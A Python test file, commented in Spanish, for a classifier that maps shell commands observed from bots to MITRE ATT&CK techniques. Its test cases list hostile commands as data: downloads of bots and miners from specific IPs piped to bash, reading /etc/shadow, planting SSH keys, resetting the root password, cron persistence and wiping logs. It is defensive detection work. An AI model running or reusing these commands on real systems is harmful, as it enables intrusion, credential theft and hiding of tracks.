#!/usr/bin/env python3
"""
Pruebas del clasificador MITRE ATT&CK (mitre_mapping.py).
Uso:  python3 scripts/test_mitre_mapping.py
Incluye comandos reales tipicos de bots y casos de posibles falsos positivos.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mitre_mapping import clasificar_comando  # noqa: E402

CASOS = {
    # Comandos tipicos de bots
    "uname -a": {"T1082"},
    "cat /etc/passwd": {"T1087.001"},
    "whoami": {"T1033"},
    "id": {"T1033"},
    "w": {"T1033"},
    "wget http://45.148.10.22/bins/bot.x86 -O /tmp/bot": {"T1105"},
    "cat /proc/cpuinfo": {"T1082"},
    "curl http://103.237.144.11/scan.sh | bash": {"T1105"},
    "free -m": {"T1082"},
    "ls -la /tmp": {"T1083"},
    "chmod +x /tmp/bot": {"T1222.002"},
    "cat /etc/shadow": {"T1003.008"},
    "history -c": {"T1070.003"},
    "rm -rf /var/log/*": {"T1070.002"},
    "nproc": {"T1082"},
    "curl http://89.248.163.200/miner.sh -o /tmp/miner.sh": {"T1105", "T1496.001"},
    "ifconfig": {"T1016"},
    "bash /tmp/miner.sh": {"T1496.001"},
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys": {"T1098.004"},
    "cd ~; chattr -ia .ssh; lockr -ia .ssh": {"T1222.002"},
    'echo "root:Xy12"|chpasswd|bash': {"T1098"},
    "(crontab -l; echo '* * * * * /tmp/x') | crontab -": {"T1053.003"},
    "echo YmFzaA== | base64 -d | sh": {"T1140"},
    "iptables -F": {"T1562.004"},
    "ps aux | grep miner": {"T1057", "T1496.001"},
    "lscpu | grep Model": {"T1082"},
    "pidof sshd": {"T1057"},
    # Sin tecnica propia (solo T1059.004, que se asigna aparte)
    "cd /tmp": set(),
    "crontab -l": set(),
    "/tmp/bot": set(),
    # Posibles falsos positivos
    "echo hidden": set(),
    "cat /tmp/window.txt": set(),
    "showip": set(),
}


def main():
    fallos = 0
    for cmd, esperado in CASOS.items():
        obtenido = {t[0] for t in clasificar_comando(cmd)}
        if obtenido != esperado:
            fallos += 1
            print(f"FALLO  {cmd!r}\n       esperado {sorted(esperado)}  obtenido {sorted(obtenido)}")
    print(f"{len(CASOS) - fallos}/{len(CASOS)} casos correctos")
    sys.exit(1 if fallos else 0)


if __name__ == "__main__":
    main()
